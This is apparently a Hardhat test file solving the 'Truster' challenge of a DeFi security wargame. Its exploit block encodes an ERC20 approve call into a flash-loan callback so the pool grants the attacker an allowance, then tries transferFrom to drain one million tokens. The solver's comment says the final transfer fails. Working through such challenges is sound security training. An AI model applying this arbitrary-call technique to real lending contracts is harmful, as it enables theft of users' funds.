const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        // Solution from video, uses solidity code to encode function data, probably more reliable? easier to use/understand? slower.
        /*
        const TrusterExploit = await ethers.getContractFactory('TrusterExploit', attacker);
        this.exploit = await TrusterExploit.deploy()

        await this.exploit.attack(this.pool.address, this.token.address);
        */

        // My solution using ethers to interact with the contract and encode the approve function
        const RobTrusterLenderPool = this.pool.connect(attacker);
        const MyToken = this.token.connect(attacker); // make sure attacker is the signer for the transferFrom function

        // encode approve ERC20 function
        let iface = new ethers.utils.Interface([
            "function approve(address spender, uint amount) returns (bool)",
            "function transferFrom(address from, address to, uint amount) returns (bool)"
        ]);

        data = iface.encodeFunctionData("approve", [attacker.address.toString(), TOKENS_IN_POOL.toString()]);

        // call flashloan
        await RobTrusterLenderPool.flashLoan(0, attacker.address, this.token.address, data);

        // check allowance of attacker to spend pools money
        let allowed = await this.token.allowance(this.pool.address, attacker.address);
        let allowance = await ethers.BigNumber.from(allowed);
        console.log(allowance.toString());

        // take take take it alllll, fails... ?not allowed?
        let boolie = await MyToken.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL.toString());
        console.log(boolie);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

